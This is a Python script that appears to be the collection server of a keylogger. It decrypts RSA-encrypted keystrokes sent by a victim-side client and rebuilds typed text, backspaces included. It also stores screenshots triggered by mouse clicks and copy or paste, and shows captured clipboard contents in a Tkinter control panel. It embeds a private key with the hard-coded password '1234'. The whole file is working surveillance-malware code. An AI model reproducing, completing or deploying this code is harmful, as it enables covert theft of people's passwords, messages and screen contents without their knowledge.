import binascii
import os
import socket
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.hashes import SHA256
import tkinter as tk
from tkinter import ttk
import threading
import random
import base64


private_key_pem = """
-----BEGIN ENCRYPTED PRIVATE KEY-----
MIIFLTBXBgkqhkiG9w0BBQ0wSjApBgkqhkiG9w0BBQwwHAQI4QfD8j82818CAggA
MAwGCCqGSIb3DQIJBQAwHQYJYIZIAWUDBAEqBBDDeqnaCRnAZ3EGnV3rsbx6BIIE
0Lsv7WKRW2pQ1aK+NCBGvOOhHfd9xLPJzr09+LkGKwouH58pjRFyy5eedDB/0/V1
ZVVAxSmd/NovIVCVAKEX2fOdqm6+V6ZtA2PP0WHH98B4hziFLz69hoYe7YvfZNjQ
eujCyAMrEqlVGpPBKlb3TNdj2mv9xZW0Xs2HjUjkpbf76dmMmGPe0whtM6XmZ0mk
Ygd9wbgooU5spR+Mfu6SFkV95xJvCdeLbpzkAgHyZ+vnc8S4WQg3K36cYt+kIowo
P2tIzEaHdPIZnxuF2F+gLLTm5LnRJSRm+9DvXYWu9e+vmwRsZ+a83ZFqEnekFQQH
9LaOKANyyHTVa/rxd72zn1DEDZCUR0wgPe1Wokmu6kUkfDaW0YkwCJUSVrUrj9BJ
ZzuJdhr7ngCRj8co/W+tAq0R/hf2hleJk9hrDanvtEYDuQ8ApNEcjERZMhS4+LpW
c4uj8YPVbwZyKb7NRxGmwRse1GJ7tFMUvNoOlCjaVwlga+fnqYS5aT3YeTItfLxG
dV39lhYDD6X4bfZIzYqGmddLQMrCDJKyCQs5obx+NtyZ3FFfscS3tSz3+U77s3hi
7yNmMCdMISdFZaXD/akpxENowIh/mPJSk3FtjexHy/s5CcTf9UeN3fRXfBnbvWQl
yirI4FH/Q+ebnocJ0DjyjU75R+yBSp3CjAAvvzNN2n+2ilt3Ie7Izptu9MQRfpyA
b1kfbd+RGcZtY9YEjpPyYAwCjtl5rU3ADmU3gQfzcI0x/cJiRYvadrWo1wWYK4xk
YCQqxGHXibzX04s0DjBwPjxpC/KB49LQNEcnTbVllNO5SGgYysuYoduKwD/g7itd
CKcru/o/b67sawHRtdx/+Bq7A20hRaOnOMIYf1ZNHKMDLCbcb18FjHdev7TDiVXS
9ojxqLq89m/Fa+OaipcfD58/tNjGjf38bwW0u9ML0JQi8V7lbgsEsuOR7R3hic56
cOWFgBRMrcoPN8pfZ+FLtnSteN/NchygKoTIIs0fWhbOCfWs5UTX+BOhApGi93T6
0SsEsCXYKmg6zVixhRS3rBg/Z0qr8gnJADVCeviNH3U4FJCorTQkvA+x14fPgB+k
z8zb9+EWNzNViSPgC6YIG2hx3K09np6S6Xt4vzdpHqk3bRdLX4soaG5MYUT+KSIe
qbLvsjJAogWqcSjXh5dcq9xeUeZ4z0UlBCfwX17klZXLysd+1D2AoHf0YgmgbG3B
+/ogsq32PfnjQuR1xVu/R7vAdZDz5yeHdmoCQNkIXOYJfUjWr47Ta+AhBEkoMOG7
vAEcYsVlIlefJQ+XPh4E1gVF1FrZHD+7pGvv+biEpE+yPJqPUd118dSRlIY/xM5r
1UnF2c6UbYENyTUwChOfb6wjd40frlA1lWqtgWNKTw7pcW/nBubAYvfwwkTgitsX
0BNy/v+EeEqqr+piY5fU+sS5DNlIdXZO6nUE8kxCy+s2PiD/vxIvj5ZDv0OSaMzt
xlzkNIJFBsZf2bEkVt8Zhx8kdS8LtKoKR4srCPlil91uTB73XxONT3RQgcPyIOuG
j8rTSzPI2yp6DnNF6uCMYvAM64CFTj3CSNDmzR480GKDCctFDrM0T4t9zhYLYFAV
4L+KwjLtHfhUZAF3cAN/kaVW0oMTStSwaTaWFQfC9UOk
-----END ENCRYPTED PRIVATE KEY-----
"""

private_key = serialization.load_pem_private_key(
    private_key_pem.encode(),
    password=b'1234'
)

config = {
    "screenshot": {"M1": False, "M2": False, "CP": False, "PT": False},
    "dynamic": False,
    "clipboard_monitor": True
}
data = ""
image_data = b""
img_accept = True


def screenshot_config_check(data):
    global img_accept
    event = data[1:3].decode()
    if config["screenshot"][event]:
        img_accept = True
    else:
        img_accept = False


def update_data_text():
    data_text.delete(1.0, tk.END)
    data_text.insert(tk.END, data)


def update_extra_data_text(new_data):
    extra_data_text.delete(1.0, tk.END)
    extra_data_text.insert(tk.END, new_data)


files = os.listdir(os.getcwd())
image_paths = [file for file in files if file.endswith(".png")]
image_index = 0


def create_gui():
    global data_text,extra_data_text

    def on_config_change():
        config["screenshot"]["M1"] = m1_var.get()
        config["screenshot"]["M2"] = m2_var.get()
        config["screenshot"]["CP"] = cp_var.get()
        config["screenshot"]["PT"] = pt_var.get()
        config["dynamic"] = dynamic_var.get()
        config["clipboard_monitor"] = clipboard_var.get()

    root = tk.Tk()
    root.title("Server")
    root.geometry("700x700")

    notebook = ttk.Notebook(root)
    notebook.pack(fill=tk.BOTH, expand=True)

    data_tab = ttk.Frame(notebook)
    notebook.add(data_tab, text="Data")

    data_text = tk.Text(data_tab)
    data_text.pack(fill=tk.BOTH, expand=True)
    extra_data_text = tk.Text(data_tab)
    extra_data_text.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)

    config_tab = ttk.Frame(notebook)
    notebook.add(config_tab, text="Config")

    m1_var = tk.BooleanVar(value=config["screenshot"]["M1"])
    m2_var = tk.BooleanVar(value=config["screenshot"]["M2"])
    cp_var = tk.BooleanVar(value=config["screenshot"]["CP"])
    pt_var = tk.BooleanVar(value=config["screenshot"]["PT"])
    dynamic_var = tk.BooleanVar(value=config["dynamic"])
    clipboard_var = tk.BooleanVar(value=config["clipboard_monitor"])

    m1_check = tk.Checkbutton(config_tab, text="Screenshot on M1", variable=m1_var, command=on_config_change)
    m1_check.pack()

    m2_check = tk.Checkbutton(config_tab, text="Screenshot on M2", variable=m2_var, command=on_config_change)
    m2_check.pack()

    cp_check = tk.Checkbutton(config_tab, text="Screenshot on CTRL+C", variable=cp_var, command=on_config_change)
    cp_check.pack()

    pt_check = tk.Checkbutton(config_tab, text="Screenshot on CTRL+V", variable=pt_var, command=on_config_change)
    pt_check.pack()

    dynamic_check = tk.Checkbutton(config_tab, text="Dynamic Logging", variable=dynamic_var, command=on_config_change)
    dynamic_check.pack()

    clipboard_check = tk.Checkbutton(config_tab, text="Clipboard Monitoring", variable=clipboard_var,
                                     command=on_config_change)
    clipboard_check.pack()

    update_data_text()

    root.mainloop()


def run_server():
    server_socket = socket.socket()
    server_socket.bind(('127.0.0.1', 1234))
    server_socket.listen()
    conn, addr = server_socket.accept()

    global data, image_data, img_accept, image_index
    image_index = 0

    while True:
        try:
            enc_data = base64.b64decode(conn.recv(200000) + b"==")
        except binascii.Error as e:
            enc_data = conn.recv(200000)
        if b"~MSG~" not in enc_data:
            while True:
                if b"IMG~" in enc_data:
                    screenshot_config_check(enc_data)
                    if img_accept:
                        filename = str(random.randint(10000000000, 999999999999))
                        with open(filename + ".png", "wb") as f:
                            f.write(enc_data[8:])
                    break
                elif enc_data:
                    if img_accept:
                        if image_data:
                            filename = str(random.randint(10000000000, 999999999999))
                            with open(filename + ".png", "wb") as f:
                                f.write(image_data)
                    break
                if not enc_data:
                    break

        else:
            plaintext = private_key.decrypt(
                enc_data[5:],
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=SHA256()),
                    algorithm=SHA256(),
                    label=None
                )
            )
            print(plaintext.decode())
            if "~~" in plaintext.decode():
                if "Copied" in plaintext.decode() or "Pasted" in plaintext.decode() and config["clipboard_monitor"]:
                    update_extra_data_text(plaintext.decode()[5:])
                elif "Copied" not in plaintext.decode() and "Pasted" not in plaintext.decode():
                    update_extra_data_text(plaintext.decode()[5:])
            elif plaintext.decode() == "~MSG~backspace" and config["dynamic"]:
                data = data[:-1]
                update_data_text()
            elif "backspace" not in plaintext.decode():
                data += plaintext.decode()[5:]
                update_data_text()


server_thread = threading.Thread(target=run_server)
gui_thread = threading.Thread(target=create_gui)

server_thread.start()
gui_thread.start()
